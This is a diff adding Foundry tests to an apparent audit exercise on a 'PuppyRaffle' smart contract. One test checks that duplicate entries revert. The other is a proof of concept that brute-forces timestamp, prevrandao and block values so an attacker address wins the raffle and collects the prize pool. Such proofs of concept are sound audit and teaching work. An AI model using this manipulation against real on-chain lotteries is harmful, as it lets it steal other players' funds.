@@ -250,4 +250,102 @@ contract PuppyRaffleTest is Test {
         assert(address(attack).balance > 1 ether);
     }
 
+    /*//////////////////////////////////////////////////////////////
+                          TEST MULTIPLE TIMES
+    //////////////////////////////////////////////////////////////*/
+    address charlie = makeAddr("charlie");
+
+    function test_CharlieEnterMultipleTime() public {
+        // ARGS for entering enterRaffle()
+        address[] memory charlieARG = new address[](2);
+        charlieARG[0] = charlie;
+        charlieARG[1] = charlie;
+
+        vm.deal(charlie, entranceFee * 2);
+        vm.prank(charlie);
+        vm.expectRevert();
+        puppyRaffle.enterRaffle{value: entranceFee * 2}(charlieARG);
+   
+    }
+
+    /*//////////////////////////////////////////////////////////////
+                               RANDOMNESS
+    //////////////////////////////////////////////////////////////*/
+    // not truly random + can be gamed + msg.sender used to find hash 
+
+    address one = address(5);
+    address two = address(6);
+    address three = address(7);
+    address four = address(8);
+    address advisory = makeAddr("advisory");
+
+
+    function test_Randomness() public {
+        // Give the entrance fee * 4 to enter for all players
+        vm.deal(one, entranceFee * 4);
+
+        // Give advisory entrance
+        vm.deal(advisory, entranceFee);
+
+        // ARGS for entering enterRaffle()
+        address[] memory playersARG = new address[](4);
+        playersARG[0] = one;
+        playersARG[1] = two;
+        playersARG[2] = three;
+        playersARG[3] = four;
+        address[] memory advisoryARG = new address[](1);
+        advisoryARG[0] = advisory; 
+
+        vm.prank(one);
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(playersARG);
+
+        // Fast forward to end of raffle
+        uint256 raffleEndTime = block.timestamp + 1 weeks + 1;
+        vm.warp(raffleEndTime);
+
+        uint256 manipulatedPrevRandao;
+        uint256 manipulatedTimestamp;
+        uint256 manipulatedBlockNumber;
+
+        // Simulate miner manipulation by trying different values
+        for (uint i = 1; i < 1000; i++) {
+            console.log("run: ", i);
+            manipulatedPrevRandao = uint256(keccak256(abi.encodePacked(i)));
+            manipulatedTimestamp = raffleEndTime + i;
+            manipulatedBlockNumber = block.number + i;
+            console.log("manipulatedTimestamp", manipulatedTimestamp);
+            console.log("manipulatedPrevRandao", manipulatedPrevRandao);
+            console.log("manipulatedBlockNumber", manipulatedBlockNumber);
+
+            // Calculate the winnerIndex with manipulated values
+            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(advisory, manipulatedTimestamp, manipulatedPrevRandao))) % (playersARG.length + 1);
+
+            // Break for loop if winnerIndex == advisory index
+            if (winnerIndex == playersARG.length ){
+                console.log("Winner index: ", winnerIndex);
+                console.log("Simulated player length: ", playersARG.length + 1);
+                console.log("manipulatedTimestamp: ", manipulatedTimestamp);
+                console.log("manipulatedPrevRandao: ", manipulatedPrevRandao);
+                break;
+            }
+        }
+
+        vm.startPrank(advisory);
+        puppyRaffle.enterRaffle{value: 1 ether}(advisoryARG);
+        vm.warp(manipulatedTimestamp);
+        vm.roll(manipulatedBlockNumber);
+        vm.prevrandao(manipulatedPrevRandao);
+        console.log("-------------------------");
+        console.log("manipulatedTimestamp: ", manipulatedTimestamp);
+        console.log("manipulatedPrevRandao: ", manipulatedPrevRandao);
+        console.log("Manipulated block number: ", manipulatedBlockNumber);
+        console.log("balance of puppyraffle: ", address(puppyRaffle).balance);
+        puppyRaffle.selectWinner();
+        vm.stopPrank();
+
+        uint256 expectedPayout = ((entranceFee * 5) * 80 / 100);
+
+        assertEq(puppyRaffle.previousWinner(), advisory);
+        assertEq(advisory.balance, expectedPayout);
+    }
 }
